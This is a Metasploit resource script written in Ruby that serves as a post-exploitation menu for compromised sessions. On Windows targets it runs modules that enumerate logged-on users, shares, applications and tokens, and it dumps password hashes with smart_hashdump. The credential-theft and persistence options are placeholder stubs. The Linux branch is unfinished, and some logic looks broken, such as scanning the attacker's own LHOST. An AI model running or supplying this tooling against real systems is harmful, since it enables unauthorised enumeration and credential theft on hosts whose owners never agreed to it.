<ruby>
   run_single("clear")
   help = %Q|
    Description:
      Resource File to assiste in post_exploitation.
      This resouce script needs to be run outside meterpreter prompt and
      will display a list of commands based on target platform (windows/linux).
      'In meterpreter prompt execute: <background> to use this script'

    Execute in msfconsole:
       resource <path-to-script>/post_exploitation.rc

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>
   |
   print_line(help)
   Rex::sleep(2.0)


      ## sellect resource file menu based on target platform
      platform = framework.db.hosts.map(&:os_name).join(' ')
      if platform =~ /windows/i or platform =~ /Windows/i
        win = %Q|

    Command      Desciption
    -------      ----------
    record       Record session activity
    gather       Run post gather modules
    creds        Run credentials modules
    persistence  Persiste exe payload (remote)
    exit         Exit post_exploitation

      |
      print_line(win)
      Rex::sleep(0.5)
      print "[Command]: "
         user_input = gets.chomp

         ## loop function to grab session ID
         framework.sessions.each do |query|
         sID = query.join(' ').first(1)
         run_single("setg SESSION #{sID}")
         end

         if user_input == "record"
            print_status("Recording session activity.")
            rand = Rex::Text.rand_text_alpha(5)
            Rex::sleep(1.0)
            run_single("spool #{rand}.log")
            run_single("unsetg all")
         elsif user_input == "gather"
            print_status("Running post gather modules.")
            Rex::sleep(1.0)
            run_single("use post/windows/gather/enum_logged_on_users")
            run_single("run")
            run_single("use post/windows/gather/enum_shares")
            run_single("run")
            run_single("use post/windows/gather/enum_applications")
            run_single("run")
            run_single("use post/windows/gather/enum_tokens")
            run_single("run")
            run_single("use post/windows/gather/smart_hashdump")
            run_single("run")
            run_single("unsetg all")
         elsif user_input == "creds"
            print_status("Running post creds modules.")
            run_single("unsetg all")
         elsif user_input == "persistence"
            print_status("Persisting payload remotely")
            run_single("unsetg all")
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            print_error("Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end


      elsif platform =~ /linux/i or platform =~ /Linux/i
        lin = %Q|

    Command      Desciption
    -------      ----------
    gather       Run post gather madules
    creds        Run credentials modules
    persistence  Persiste exe payload

      |
      print_line(lin)
      Rex::sleep(2.0)
      print "[Command]: "
         addr = gets.chomp

         # post/linux/gather/hashdump


      elsif platform.nil? or platform == '' or platform == ' '
         print_error("[ABORT] target platform not found in database.")
         print_warning("Running db_nmap to populate database with host info")
         Rex::sleep(1.0)
         run_single("db_nmap -sV -Pn -T4 -O --open #{framework.datastore['LHOST']}")
         return nil
      else
         print_error("[ABORT] target platform not supported.")
         Rex::sleep(1.0)
         return nil
      end

   run_single("back")
</ruby>
